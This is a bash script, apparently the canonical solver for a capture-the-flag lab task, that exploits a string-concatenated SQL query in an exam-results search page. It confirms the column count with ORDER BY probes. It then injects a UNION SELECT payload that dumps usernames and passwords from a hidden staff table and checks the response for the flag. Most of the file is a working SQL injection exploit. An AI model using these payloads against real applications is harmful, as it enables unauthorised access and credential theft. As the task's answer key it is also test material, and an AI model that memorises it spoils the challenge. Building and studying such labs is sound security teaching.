#!/usr/bin/env bash
# solvers/p1_3.sh, Task 1.3 "Exam Results Board" canonical exploit.
#
# The results search route builds its query with raw string concatenation:
#   SELECT id,name,score FROM results WHERE name LIKE '%{q}%'
# and renders every returned row straight into an HTML table. That's a
# 3-column result set an attacker can extend with UNION SELECT, as long as
# the injected SELECT also returns exactly 3 columns, no error channel
# needed (unlike p1_2), the union'd rows just show up as ordinary-looking
# table rows.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{append_your_own_select}"

echo "[p1_3] step 1: confirm 3 columns is in range: ' ORDER BY 3-- -"
resp_ok=$(curl -s -G "${BASE}/p1/results" --data-urlencode "q=' ORDER BY 3-- -")
if echo "$resp_ok" | grep -qi "Unknown column"; then
    echo "  FAIL: ORDER BY 3 unexpectedly errored"
    echo "$resp_ok"
    echo "[p1_3] FAIL"
    exit 1
fi
echo "  ok: ORDER BY 3 did not error"

echo "[p1_3] step 2: confirm column 4 is out of range: ' ORDER BY 4-- -"
resp_bad=$(curl -s -G "${BASE}/p1/results" --data-urlencode "q=' ORDER BY 4-- -")
if echo "$resp_bad" | grep -qi "Unknown column"; then
    echo "  ok: ORDER BY 4 errored, column count confirmed at 3"
else
    echo "  FAIL: ORDER BY 4 did not error as expected"
    echo "$resp_bad"
    echo "[p1_3] FAIL"
    exit 1
fi

echo "[p1_3] step 3: UNION SELECT extraction from the hidden staff table"
PAYLOAD="' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM staff-- -"
resp=$(curl -s -G "${BASE}/p1/results" --data-urlencode "q=${PAYLOAD}")

if echo "$resp" | grep -qF "$FLAG"; then
    echo "  ok: response contains flag: ${FLAG}"
    echo "[p1_3] PASS"
    exit 0
else
    echo "  FAIL: response did not contain the flag"
    echo "---- response body ----"
    echo "$resp"
    echo "------------------------"
    echo "[p1_3] FAIL"
    exit 1
fi
